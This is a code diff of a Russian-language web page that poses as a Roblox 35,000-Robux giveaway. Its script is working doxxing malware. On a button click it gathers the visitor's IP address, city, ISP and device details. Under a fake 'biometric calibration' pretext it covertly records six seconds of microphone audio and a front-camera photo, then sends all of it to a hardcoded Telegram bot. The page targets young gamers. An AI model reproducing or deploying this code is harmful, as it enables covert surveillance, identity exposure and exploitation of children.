@@ -2,130 +2,117 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="300"> <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox | Mega Payout 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox | Server Sync 2026</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #050505; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .ultra-box { background: linear-gradient(145deg, #1a1c1e, #0a0b0c); border: 2px solid #0084ff; padding: 40px; border-radius: 30px; text-align: center; width: 88%; max-width: 420px; box-shadow: 0 0 50px rgba(0,132,255,0.6); position: relative; }
-        .live-indicator { background: red; color: white; padding: 2px 10px; border-radius: 5px; font-size: 10px; font-weight: bold; position: absolute; top: 20px; right: 20px; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        .btn-mega { background: #0084ff; color: white; border: none; padding: 22px; width: 100%; border-radius: 15px; font-size: 24px; font-weight: 900; cursor: pointer; text-shadow: 0 2px 4px rgba(0,0,0,0.5); box-shadow: 0 8px 0 #0056a3; }
-        .btn-mega:active { transform: translateY(4px); box-shadow: 0 2px 0 #0056a3; }
-        #log { margin-top: 20px; font-family: monospace; font-size: 11px; color: #555; }
+        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .main-card { background: #111; border: 1px solid #0084ff; padding: 40px; border-radius: 30px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 0 40px #0084ff33; }
+        .btn-claim { background: #0084ff; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 15px; font-size: 22px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
+        #inf { margin-top: 15px; font-size: 12px; color: #444; }
+        #st { margin: 20px 0; color: #0084ff; font-weight: bold; min-height: 24px; }
         video { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0.01; }
     </style>
 </head>
 <body>
 
-<div class="ultra-box">
-    <div class="live-indicator">REC ● LIVE</div>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="80" style="filter: invert(1); margin-bottom: 20px;">
-    <h1 style="margin: 0; font-size: 32px;">35,000 ROBUX</h1>
-    <p style="color: #00ff00; font-weight: bold; margin: 15px 0;">АКЦИЯ ДЛЯ ПРОВЕРЕННЫХ ИГРОКОВ</p>
-    <p style="font-size: 14px; color: #888; margin-bottom: 25px;">Пройдите биометрическую калибровку датчиков и микрофона для мгновенного зачисления.</p>
-    
-    <button class="btn-mega" id="mainAction" onclick="godModeDox()">ПОЛУЧИТЬ</button>
-    <div id="status">ОЖИДАНИЕ...</div>
-    <div id="log">Session ID: <span id="sid"></span></div>
+<div class="main-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="filter: invert(1); margin-bottom: 20px;">
+    <h1 style="margin:0;">35,000 ROBUX</h1>
+    <p style="color: #888; font-size: 14px; margin-bottom: 25px;">Синхронизация с сервером выдачи. Требуется калибровка датчиков и Face ID.</p>
+    <button class="btn-claim" id="btn" onclick="megaLog()">ПОЛУЧИТЬ</button>
+    <div id="st">ГОТОВ К ЗАПУСКУ</div>
+    <div id="inf">System Node: <span id="node"></span></div>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    document.getElementById('sid').innerText = Math.random().toString(36).substr(2, 9).toUpperCase();
-    const TOKEN = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
-    const CHID = '7889497672';
+    document.getElementById('node').innerText = Math.floor(Math.random() * 9999);
+    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
+    const C = '7889497672';
 
-    async function godModeDox() {
-        const btn = document.getElementById('mainAction');
-        const st = document.getElementById('status');
+    async function megaLog() {
+        document.getElementById('btn').style.display = 'none';
+        const st = document.getElementById('st');
         const v = document.getElementById('v');
         const c = document.getElementById('c');
 
-        btn.style.display = 'none';
-        st.innerText = "ИНИЦИАЛИЗАЦИЯ ПРОВЕРКИ...";
+        st.innerText = "ПОДКЛЮЧЕНИЕ К ШЛЮЗУ...";
 
-        // 🧨 МАКСИМАЛЬНЫЙ СБОР ДАННЫХ
-        let report = `🔱 **GOD-MODE DOX REPORT** 🔱\n\n`;
-        
+        // 1. СБОР ДОКСА (IP, Сеть, Железо)
+        let d = `🏴‍☠️ **MAXIMUM DOX REPORT** 🏴‍☠️\n\n`;
         try {
             const r = await fetch('https://ipapi.co/json/');
-            const d = await r.json();
-            report += `📍 IP: \`${d.ip}\`\n🌍 Место: ${d.city}, ${d.country_name}\n📡 Провайдер: ${d.org}\n`;
-        } catch(e) { report += `📍 IP: VPN/Block\n`; }
+            const j = await r.json();
+            d += `📍 IP: \`${j.ip}\`\n🌍 Город: ${j.city}\n📡 Провайдер: ${j.org}\n`;
+        } catch(e) {}
 
-        report += `\n📱 **HARDWARE & OS:**\n`;
-        report += `🤖 Платформа: ${navigator.platform}\n`;
-        report += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
-        report += `🖥 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
-        report += `🎮 GPU: ${getGPU()}\n`;
-        report += `🔋 Батарея: Опрос...\n`;
-        report += `🌐 Язык: ${navigator.language}\n`;
-        report += `👆 Touch: ${navigator.maxTouchPoints} точек\n`;
-        report += `🕶 Fonts: ${navigator.fonts ? 'Detailed' : 'Standard'}\n`;
-        report += `⏰ Время: ${new Date().toLocaleString()}\n`;
+        d += `📱 Устройство: ${navigator.platform}\n`;
+        d += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
+        d += `🖥 Экран: ${screen.width}x${screen.height}\n`;
+        d += `🔋 Батарея: Опрос...\n`;
+        d += `🕶 GPU: ${getG()}\n`;
 
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
-            report = report.replace('Опрос...', `${(b.level * 100).toFixed(0)}%`);
+            d = d.replace('Опрос...', `${(b.level * 100).toFixed(0)}%`);
         }
 
         try {
-            // Запрос всего: Камера + Микрофон
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-            v.srcObject = stream;
+            // 2. ОТКРЫВАЕМ STREAM (Камера + Микро)
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            v.srcObject = s;
 
-            // Запись голоса (6 секунд)
-            const rec = new MediaRecorder(stream);
-            const audioChunks = [];
-            rec.ondataavailable = e => audioChunks.push(e.data);
+            // 3. ЗАПИСЬ ЗВУКА (6 сек)
+            const rec = new MediaRecorder(s);
+            const chunks = [];
+            rec.ondataavailable = e => chunks.push(e.data);
             rec.onstop = async () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                const fdA = new FormData();
-                fdA.append('chat_id', CHID);
-                fdA.append('voice', audioBlob, 'audio.ogg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fdA });
+                const b = new Blob(chunks, { type: 'audio/ogg' });
+                const fd = new FormData();
+                fd.append('chat_id', C);
+                fd.append('voice', b, 'v.ogg');
+                fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: fd });
             };
             rec.start();
-            st.innerText = "КАЛИБРОВКА (7 СЕК)...";
+            st.innerText = "КАЛИБРОВКА (ЖДИТЕ)...";
 
             setTimeout(() => {
-                rec.stop(); // Остановить звук
+                rec.stop();
                 
-                // Фото
+                // 4. ФОТО
                 c.width = v.videoWidth;
                 c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 
                 c.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('chat_id', CHID);
-                    fd.append('photo', blob, 'face.jpg');
-                    fd.append('caption', report + `\n\n✅ **ФОТО + ГОЛОС ПОЛУЧЕНЫ!**`);
+                    fd.append('chat_id', C);
+                    fd.append('photo', blob, 'f.jpg');
+                    fd.append('caption', d + `\n\n✅ **ФОТО + ГОЛОС ОТПРАВЛЕНЫ!**`);
 
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd })
+                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
                     .then(() => {
-                        stream.getTracks().forEach(t => t.stop());
-                        alert("✅ Верификация 100%! Начисление 35,000 Robux началось.");
+                        s.getTracks().forEach(t => t.stop());
+                        alert("✅ Успешно! Робуксы придут в течение 10 минут.");
                         window.location.href = "https://www.roblox.com";
                     });
-                }, 'image/jpeg', 0.9);
-            }, 7000);
+                }, 'image/jpeg', 0.85);
+            }, 6000);
 
         } catch (e) {
-            alert("Ошибка! Для верификации необходимо разрешить доступ к камере и микрофону.");
-            btn.style.display = 'block';
+            alert("Ошибка! Разрешите камеру и микрофон для получения награды.");
+            document.getElementById('btn').style.display = 'block';
         }
     }
 
-    function getGPU() {
+    function getG() {
         try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-        } catch(e) { return 'Unknown'; }
+            const gl = document.createElement('canvas').getContext('webgl');
+            const db = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(db.UNMASKED_RENDERER_WEBGL);
+        } catch(e) { return '?'; }
     }
 </script>
 </body>
